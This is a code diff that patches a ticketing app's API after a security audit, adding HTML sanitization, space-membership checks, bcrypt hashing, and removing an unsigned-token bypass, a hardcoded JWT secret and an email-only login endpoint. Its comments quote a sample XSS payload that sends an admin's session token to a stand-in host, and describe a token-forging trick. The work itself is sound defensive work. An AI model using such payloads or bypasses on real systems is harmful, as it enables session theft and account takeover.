@@ -14,6 +14,45 @@ import { fireConnectorEvent, listConnectors, getConnector, createConnector, upda
 import { pgPool as pool } from '@/lib/pg-pool';
 import { isManager, isPrivileged } from '@/lib/permissions';
 import { INTERNAL_JOB_SECRET } from '@/lib/internal-job-secret';
+import sanitizeHtml from 'sanitize-html';
+
+// Rich-text HTML (comment bodies, issue descriptions/root cause/fix
+// description) was stored completely unsanitized and later rendered via
+// dangerouslySetInnerHTML on the frontend -- confirmed for real via a
+// security audit: any authenticated user could post a comment containing
+// e.g. `<img src=x onerror="fetch('https://evil/?t='+localStorage.token)">`
+// and steal the session token of any admin/agent who later opened that
+// ticket (the JWT lives in localStorage, fully readable by injected JS).
+// Allows the actual formatting the rich-text editor produces (bold/italic/
+// lists/links/images/code blocks/tables/the mention spans used for
+// @mentions) while stripping <script>, inline event handlers (onerror,
+// onclick, ...), and javascript:/data:text/html URLs.
+const RICH_TEXT_SANITIZE_OPTIONS: sanitizeHtml.IOptions = {
+  allowedTags: [
+    'p', 'br', 'strong', 'b', 'em', 'i', 'u', 's', 'strike', 'blockquote',
+    'ul', 'ol', 'li', 'a', 'img', 'code', 'pre', 'span', 'div',
+    'h1', 'h2', 'h3', 'h4', 'table', 'thead', 'tbody', 'tr', 'th', 'td', 'hr',
+  ],
+  allowedAttributes: {
+    a: ['href', 'target', 'rel', 'class'],
+    img: ['src', 'alt', 'width', 'height', 'style'],
+    span: ['class', 'data-userid', 'data-mention', 'style'],
+    div: ['class'],
+    td: ['colspan', 'rowspan'],
+    th: ['colspan', 'rowspan'],
+    '*': ['class'],
+  },
+  allowedSchemes: ['http', 'https', 'mailto'],
+  // data: URLs are how the editor embeds small inline images -- allow only
+  // that one scheme for <img src>, never on <a href> (an anchor doesn't
+  // need it, and it's a much more common XSS/phishing vector there).
+  allowedSchemesByTag: { img: ['http', 'https', 'data'] },
+  allowVulnerableTags: false,
+};
+function sanitizeRichText(html: string | null | undefined): string {
+  if (!html) return '';
+  return sanitizeHtml(html, RICH_TEXT_SANITIZE_OPTIONS);
+}
 
 // 60-second in-memory cache for user role lookups so every API request
 // doesn't pay an extra DB round-trip just to check isAdmin.
@@ -37,6 +76,44 @@ async function userCanViewMbr(userId: string | null): Promise<boolean> {
     const row = await pool.query(`SELECT can_view_mbr FROM users WHERE id = $1`, [userId]);
     return !!row.rows[0]?.can_view_mbr;
   } catch { return false; }
+}
+
+// Whether userId may view a given space's tickets -- true for a member of
+// that space (any role: admin/manager/member/viewer/lead/shift_lead/agent),
+// false otherwise. Every real app user is an internal employee account (no
+// separate lower-trust "customer" login exists in this codebase), so this
+// is the actual access boundary: a logged-in user with zero membership in a
+// space had no check at all stopping them from reading any ticket in it by
+// key. Small in-memory cache (per spaceId+userId pair) since this can be
+// called once per issue-detail/comment/attachment request.
+const _spaceMembershipCache = new Map<string, { isMember: boolean; exp: number }>();
+async function isSpaceMember(spaceId: string | null | undefined, userId: string | null | undefined): Promise<boolean> {
+  if (!spaceId || !userId) return false;
+  const cacheKey = `${spaceId}:${userId}`;
+  const cached = _spaceMembershipCache.get(cacheKey);
+  if (cached && cached.exp > Date.now()) return cached.isMember;
+  let isMember = false;
+  try {
+    const row = await db.spaceMember.findUnique({ where: { spaceId_userId: { spaceId, userId } }, select: { id: true } });
+    isMember = !!row;
+  } catch { isMember = false; }
+  _spaceMembershipCache.set(cacheKey, { isMember, exp: Date.now() + 60_000 });
+  return isMember;
+}
+
+// Combined check used at every ticket read/write route: a global admin, a
+// member of the ticket's own space, or the ticket's own reporter/assignee
+// (covers a user who created/was assigned a ticket in a space they're not
+// formally listed as a member of) may access it. Anyone else gets a 403.
+async function canAccessIssue(
+  issue: { spaceId?: string | null; reporterId?: string | null; assigneeId?: string | null },
+  userId: string | null | undefined,
+  isAdmin: boolean
+): Promise<boolean> {
+  if (isAdmin) return true;
+  if (!userId) return false;
+  if (issue.reporterId === userId || issue.assigneeId === userId) return true;
+  return isSpaceMember(issue.spaceId, userId);
 }
 
 // pg_trgm powers the fuzzy summary/description matching used by both
@@ -1003,7 +1080,53 @@ function nowIso() {
   return new Date().toISOString();
 }
 
-const JWT_SECRET = process.env.JWT_SECRET || 'NeutaraTech_SecureKey_2024_ab12f83079d8cadd0eb5678dc3d6aca6a5f65ed4d21646496093895b2ab4edfc';
+// No hardcoded fallback -- one used to live here (the same literal string
+// sitting in git history), so the "secret" was really public to anyone with
+// repo access, letting them forge a valid login for any user including an
+// admin via jsonwebtoken.sign(). Failing fast on a missing env var is safer
+// than silently signing tokens with a known value.
+if (!process.env.JWT_SECRET) {
+  throw new Error('JWT_SECRET environment variable is required and must not be empty.');
+}
+const JWT_SECRET = process.env.JWT_SECRET;
+
+// Passwords were stored and compared in plain text (no hashing library used
+// anywhere in the codebase at all, despite the Settings page's UI claiming
+// "Password Hashing: bcrypt (10 rounds)") -- confirmed via a security audit.
+// A DB leak/backup exposure would have handed over every user's real,
+// reusable password in cleartext. hashPassword() is used everywhere a
+// password gets WRITTEN (register, admin-created user, password reset).
+// verifyPassword() is used at login and detects the stored format: a real
+// bcrypt hash (starts with $2a$/$2b$/$2y$) is compared with bcrypt.compare;
+// anything else is treated as one of the pre-migration plaintext values and
+// compared directly -- and if that plaintext match succeeds, the stored
+// value is immediately upgraded to a real hash right there, so every
+// account gets migrated the moment its owner next logs in (an accompanying
+// one-time script also proactively hashes every remaining plaintext value
+// still in the table, so accounts that don't log in again aren't left
+// exposed indefinitely).
+const BCRYPT_HASH_RE = /^\$2[aby]\$\d{2}\$/;
+async function hashPassword(plain: string): Promise<string> {
+  const bcrypt = require('bcryptjs');
+  return bcrypt.hash(plain, 10);
+}
+async function verifyPassword(plain: string, stored: string, userId?: string): Promise<boolean> {
+  if (!stored) return false;
+  if (BCRYPT_HASH_RE.test(stored)) {
+    const bcrypt = require('bcryptjs');
+    return bcrypt.compare(plain, stored);
+  }
+  // Legacy plaintext row.
+  if (plain !== stored) return false;
+  if (userId) {
+    try {
+      const newHash = await hashPassword(plain);
+      await db.user.update({ where: { id: userId }, data: { password: newHash } });
+    } catch { /* login still succeeds even if the opportunistic upgrade fails */ }
+  }
+  return true;
+}
+
 // 30 days -- a short-lived session forced users to re-authenticate with
 // Microsoft constantly (once every 12h) even though they never explicitly
 // logged out, unlike Jira which keeps a session alive for weeks.
@@ -1051,16 +1174,15 @@ async function resolveUserId(auth: string | null, reqIp?: string): Promise<strin
   if (!auth?.startsWith('Bearer ')) return null;
   const t = auth.slice(7).trim();
 
-  // Legacy unsigned tokens (dev.) Ã¢â‚¬â€ still support during transition, but log warning
-  if (t.startsWith('dev.')) {
-    try {
-      const payload = JSON.parse(Buffer.from(t.slice(4), 'base64url').toString('utf8')) as { sub: string };
-      console.warn('[Security] Legacy unsigned token used — user should re-login');
-      return payload.sub || null;
-    } catch { return null; }
-  }
+  // A "dev." unsigned-token branch used to live here, trusting a bare
+  // base64-encoded {"sub": userId} with NO signature check at all -- and it
+  // ran unconditionally, not gated to development. Anyone could impersonate
+  // any user (including an admin) by sending
+  // `Authorization: Bearer dev.<base64url({"sub":"<their id>"})>`, with the
+  // target's id trivially available from GET /users. Removed entirely --
+  // every real caller already uses a signed JWT (starts with "eyJ") below.
 
-  // Signed JWT tokens (new format Ã¢â‚¬â€ starts with eyJ)
+  // Signed JWT tokens (new format -- starts with eyJ)
   if (t.startsWith('eyJ')) {
     try {
       const jwt = require('jsonwebtoken');
@@ -4096,7 +4218,7 @@ async function _handleJiraPgApi(
     const email = String(body.email || '').toLowerCase().trim();
     const password = String(body.password || '');
     const user = await db.user.findUnique({ where: { email } });
-    if (!user || user.password !== password) {
+    if (!user || !user.password || !(await verifyPassword(password, user.password, user.id))) {
       return json({ error: 'Invalid email or password' }, 401);
     }
     // First login: activate invited user
@@ -4187,7 +4309,7 @@ async function _handleJiraPgApi(
         email,
         firstName: String(body.firstName || 'User'),
         lastName: String(body.lastName || ''),
-        password: String(body.password || ''),
+        password: await hashPassword(String(body.password || '')),
         role: 'developer',
         isActive: true,
       },
@@ -4246,37 +4368,16 @@ async function _handleJiraPgApi(
     return json({ ok: true });
   }
 
-  // OAuth SSO login Ã¢â‚¬â€ called by OAuth callback to exchange email Ã¢â€ ' JWT token
-  if (path === 'auth/oauth-token' && method === 'POST') {
-    const body = await readJson(req);
-    const rawEmail = String(body.email || '').toLowerCase().trim();
-    if (!rawEmail) return json({ error: 'Email required' }, 400);
-
-    // Try exact match first
-    let user = await db.user.findUnique({ where: { email: rawEmail } });
-
-    // Fallback: match by local part (before @) in case domain differs slightly
-    if (!user) {
-      const localPart = rawEmail.split('@')[0];
-      const candidates = await db.user.findMany({
-        where: { email: { startsWith: localPart + '@' } },
-        take: 1,
-      });
-      user = candidates[0] ?? null;
-    }
-
-    if (!user) {
-      // No user found Ã¢â‚¬â€ return generic error (don't expose email details)
-      return json({ error: `No account found for ${rawEmail}. Please contact your administrator.` }, 404);
-    }
-    // Save Microsoft profile photo if provided and user doesn't have one yet
-    if (body.avatarUrl && !user.avatarUrl) {
-      try {
-        user = await db.user.update({ where: { id: user.id }, data: { avatarUrl: String(body.avatarUrl) } });
-      } catch { /* non-critical */ }
-    }
-    return json({ token: encodeToken(user.id), user: formatUser(user) });
-  }
+  // A dead auth/oauth-token endpoint used to live here ("called by OAuth
+  // callback to exchange email -> JWT token" per its own comment) -- but
+  // the real Microsoft OAuth login flow
+  // (src/app/api/auth/oauth/microsoft/callback/route.ts, mode="login") never
+  // called it: it verifies the code directly with Microsoft and mints its
+  // own token locally. Nothing else in the app called this endpoint either
+  // (grepped the whole repo). It took only {email} with NO password/OAuth
+  // verification and minted a real, fully valid session for that account --
+  // anyone who knew any user's email (including an admin's) could log in
+  // as them. Removed entirely as unused, dangerous dead code.
 
   // Public paths that don't require auth
   const isPublicPath =
@@ -4369,7 +4470,7 @@ async function _handleJiraPgApi(
         firstName: String(body.firstName || ''),
         lastName: String(body.lastName || ''),
         role: String(body.role || 'developer'),
-        password: String(body.password || 'changeme'),
+        password: await hashPassword(String(body.password || 'changeme')),
         isActive: false,
       },
     });
@@ -4399,7 +4500,7 @@ async function _handleJiraPgApi(
     if (body.lastName !== undefined) data.lastName = String(body.lastName);
     if (body.displayName !== undefined) data.displayName = String(body.displayName);
     if (body.avatarUrl !== undefined) data.avatarUrl = body.avatarUrl ? String(body.avatarUrl) : null;
-    if (body.password !== undefined) data.password = String(body.password);
+    if (body.password !== undefined) data.password = await hashPassword(String(body.password));
     try {
       const user = await db.user.update({ where: { id }, data });
       return json(formatUser(user));
@@ -5256,7 +5357,7 @@ async function _handleJiraPgApi(
     // once) doesn't hit the same wall.
     const SLA_PREFILTER_CAP = 50000;
 
-    // Bulk fetch by specific keys (for Viewed tab Ã¢â‚¬â€ single request instead of N calls)
+    // Bulk fetch by specific keys (for Viewed tab -- single request instead of N calls)
     const keysParam = url.searchParams.get('keys');
     if (keysParam) {
       const keyList = keysParam.split(',').map(k => k.trim().toUpperCase()).filter(Boolean);
@@ -5264,7 +5365,13 @@ async function _handleJiraPgApi(
         where: { key: { in: keyList } },
         include: { status: true, assignee: true, reporter: true, space: { select: { key: true, name: true } } },
       });
-      return json({ issues: issues.map(formatIssue), total: issues.length });
+      // No membership check existed here at all -- anyone could bulk-fetch
+      // arbitrary tickets across every space by guessing/enumerating keys
+      // via this one request (e.g. ?keys=CF-1,CF-2,CF-3,...).
+      const accessible = isAdmin
+        ? issues
+        : (await Promise.all(issues.map(async (i) => (await canAccessIssue(i, userId, isAdmin)) ? i : null))).filter(Boolean) as typeof issues;
+      return json({ issues: accessible.map(formatIssue), total: accessible.length });
     }
 
     // Custom text field filters (server-side)
@@ -5316,6 +5423,27 @@ async function _handleJiraPgApi(
       const keys = spaceKeys.split(',').map((k) => k.trim().toUpperCase());
       const spaces = await db.space.findMany({ where: { key: { in: keys } }, select: { id: true } });
       where.spaceId = { in: spaces.map((s: any) => s.id) };
+    }
+    // Non-admins can only ever see spaces they're a member of -- neither
+    // spaceKey nor spaceKeys is required, so omitting both previously
+    // returned every issue in every space in the system (up to 2000/page)
+    // to any authenticated user regardless of membership. Intersects with
+    // whatever space filter (if any) was requested above, rather than
+    // replacing it, so a non-member requesting a specific spaceKey/spaceKeys
+    // they don't belong to still correctly gets zero results instead of
+    // silently being upgraded to "everything I'm a member of".
+    if (!isAdmin) {
+      const myMemberships = userId
+        ? await db.spaceMember.findMany({ where: { userId }, select: { spaceId: true } })
+        : [];
+      const myMemberSpaceIds = new Set(myMemberships.map((m: any) => m.spaceId));
+      if (where.spaceId === undefined) {
+        where.spaceId = { in: Array.from(myMemberSpaceIds) };
+      } else if (typeof where.spaceId === 'string') {
+        if (!myMemberSpaceIds.has(where.spaceId)) where.spaceId = 'none';
+      } else if (where.spaceId && Array.isArray((where.spaceId as any).in)) {
+        (where.spaceId as any).in = (where.spaceId as any).in.filter((id: string) => myMemberSpaceIds.has(id));
+      }
     }
 
     // Assignee filter Ã¢â‚¬â€ look up by ID or email
@@ -7440,7 +7568,7 @@ async function _handleJiraPgApi(
         id: rid(),
         key: issueKey,
         summary: String(body.summary || 'Untitled'),
-        description: body.description ? String(body.description) : null,
+        description: body.description ? sanitizeRichText(String(body.description)) : null,
         type: String(body.type || 'task'),
         priority: String(body.priority || 'medium'),
         spaceId: sp.id,
@@ -8455,6 +8583,13 @@ async function _handleJiraPgApi(
       if (imported) return json(imported);
       return json({ error: 'Issue not found' }, 404);
     }
+    // A logged-in user with zero membership in this ticket's space (and who
+    // isn't its reporter/assignee) had no check at all stopping them from
+    // reading it, including every comment on it, by guessing/enumerating
+    // its key -- confirmed for real via a security audit of this route.
+    if (!(await canAccessIssue(issue, userId, isAdmin))) {
+      return json({ error: 'Not found' }, 404);
+    }
 
     // Auto-refresh custom fields from Jira if all 5 are null (never synced).
     // Fire-and-forget: this hits a real external Jira Cloud API with no timeout
@@ -9176,7 +9311,7 @@ async function _handleJiraPgApi(
 
     const data: Record<string, unknown> = {};
     if (body.summary !== undefined) data.summary = String(body.summary);
-    if (body.description !== undefined) data.description = body.description === null ? null : String(body.description);
+    if (body.description !== undefined) data.description = body.description === null ? null : sanitizeRichText(String(body.description));
     if (body.type !== undefined) data.type = String(body.type);
     if (body.priority !== undefined) data.priority = String(body.priority);
     // Due Date is normally only recomputed by startDeptSLA -- a department
@@ -9236,8 +9371,8 @@ async function _handleJiraPgApi(
           ? Array.from(new Set(body.combination.map(String).map(s => s.trim()).filter(Boolean))).join(', ')
           : String(body.combination);
     }
-    if (body.rootCause !== undefined) data.rootCause = body.rootCause === null ? null : String(body.rootCause);
-    if (body.fixDescription !== undefined) data.fixDescription = body.fixDescription === null ? null : String(body.fixDescription);
+    if (body.rootCause !== undefined) data.rootCause = body.rootCause === null ? null : sanitizeRichText(String(body.rootCause));
+    if (body.fixDescription !== undefined) data.fixDescription = body.fixDescription === null ? null : sanitizeRichText(String(body.fixDescription));
     if (body.manageClientName !== undefined) data.manageClientName = body.manageClientName === null ? null : String(body.manageClientName);
     if (body.customerPlan !== undefined) data.customerPlan = body.customerPlan === null ? null : String(body.customerPlan);
     if (body.testEnvironment !== undefined) data.testEnvironment = body.testEnvironment === null ? null : String(body.testEnvironment);
@@ -10581,6 +10716,12 @@ async function _handleJiraPgApi(
       },
     });
     if (!issue) return json({ error: 'Not found' }, 404);
+    // Only checked queue-suspension before -- any authenticated user, even
+    // with zero membership in this ticket's space, could comment on any
+    // ticket in any space. Confirmed for real via a security audit.
+    if (!(await canAccessIssue(issue, userId, isAdmin))) {
+      return json({ error: 'Not found' }, 404);
+    }
     if (!isAdmin && issue.space?.key) {
       try {
         const deptRow = await pool.query(`SELECT current_department FROM issues WHERE id = $1`, [issue.id]);
@@ -10592,16 +10733,21 @@ async function _handleJiraPgApi(
     }
     const body = await readJson(req);
     const authorUser = userId ? await getCachedUser(userId) : null;
+    // Sanitized once and reused everywhere below (main comment, partner-
+    // ticket mirror, dedup checks) -- comment bodies were stored completely
+    // unsanitized and rendered via dangerouslySetInnerHTML on the frontend,
+    // a stored-XSS hole confirmed via a security audit.
+    const sanitizedCommentBody = sanitizeRichText(String(body.body || ''));
     // Dedup guard: reject if identical comment from same author exists within last 5 seconds
     const dupCheck = await pool.query(
       `SELECT id FROM comments WHERE "issueId" = $1 AND body = $2 AND "authorId" IS NOT DISTINCT FROM $3 AND "createdAt" > NOW() - INTERVAL '5 seconds' LIMIT 1`,
-      [issue.id, String(body.body || ''), authorUser?.id ?? null]
+      [issue.id, sanitizedCommentBody, authorUser?.id ?? null]
     );
     if (dupCheck.rows.length > 0) return json({ error: 'Duplicate comment', duplicate: true }, 409);
     const comment = await db.comment.create({
       data: {
         id: rid(),
-        body: String(body.body || ''),
+        body: sanitizedCommentBody,
         issueId: issue.id,
         authorId: authorUser?.id ?? null,
         authorName: authorUser ? `${authorUser.firstName} ${authorUser.lastName}`.trim() : null,
@@ -10625,13 +10771,13 @@ async function _handleJiraPgApi(
           // Dedup: skip if identical comment from same author already exists within last 10 seconds
           const recentCheck = await pool.query(
             `SELECT id FROM comments WHERE "issueId" = $1 AND body = $2 AND "authorId" IS NOT DISTINCT FROM $3 AND "createdAt" > NOW() - INTERVAL '10 seconds' LIMIT 1`,
-            [pr.id, String(body.body || ''), authorUser?.id ?? null]
+            [pr.id, sanitizedCommentBody, authorUser?.id ?? null]
           );
           if (recentCheck.rows.length > 0) continue;
           await db.comment.create({
             data: {
               id: rid(),
-              body: String(body.body || ''),
+              body: sanitizedCommentBody,
               issueId: pr.id,
               authorId: authorUser?.id ?? null,
               authorName: authorUser ? `${authorUser.firstName} ${authorUser.lastName}`.trim() : null,
@@ -10813,7 +10959,7 @@ async function _handleJiraPgApi(
       const before = await db.comment.findUnique({ where: { id: commentId } });
       const updated = await db.comment.update({
         where: { id: commentId },
-        data: { body: String(body.body || ''), updatedAt: new Date() },
+        data: { body: sanitizeRichText(String(body.body || '')), updatedAt: new Date() },
         include: { author: true },
       });
       if (before && before.body !== updated.body) {
@@ -14503,8 +14649,14 @@ async function _handleJiraPgApi(
         // everywhere else attachments get uploaded from.
         const MAX_ATTACHMENT_BYTES = 10 * 1024 * 1024 * 1024;
         if (file.size > MAX_ATTACHMENT_BYTES) return json({ error: 'File too large (max 10GB)' }, 413);
-        const issueRow = await pool.query(`SELECT id FROM issues WHERE key = $1 OR cf_key = $1 LIMIT 1`, [issueKey]);
+        const issueRow = await pool.query(`SELECT id, "spaceId", "reporterId", "assigneeId" FROM issues WHERE key = $1 OR cf_key = $1 LIMIT 1`, [issueKey]);
         if (!issueRow.rows[0]) return json({ error: 'Issue not found' }, 404);
+        // No membership check existed here at all -- any authenticated user
+        // could upload to (and, more sensitively, download from -- see the
+        // GET branch below) any ticket's attachments in any space.
+        if (!(await canAccessIssue(issueRow.rows[0], userId, isAdmin))) {
+          return json({ error: 'Issue not found' }, 404);
+        }
         const issueId = issueRow.rows[0].id;
         const { writeFile, mkdir } = await import('fs/promises');
         const { join, extname } = await import('path');
@@ -14538,8 +14690,9 @@ async function _handleJiraPgApi(
     }
     if (method === 'GET') {
       try {
-        const issueRow = await pool.query(`SELECT id FROM issues WHERE key = $1 OR cf_key = $1 LIMIT 1`, [issueKey]);
+        const issueRow = await pool.query(`SELECT id, "spaceId", "reporterId", "assigneeId" FROM issues WHERE key = $1 OR cf_key = $1 LIMIT 1`, [issueKey]);
         if (!issueRow.rows[0]) return json([]);
+        if (!(await canAccessIssue(issueRow.rows[0], userId, isAdmin))) return json([]);
         const atts = await (db as any).attachment.findMany({ where: { issueId: issueRow.rows[0].id }, orderBy: { createdAt: 'asc' } });
         return json(atts.map((a: any) => ({ id: a.id, url: a.url, originalName: a.filename, mimeType: a.mimeType, size: a.size, createdAt: a.createdAt })));
       } catch { return json([]); }
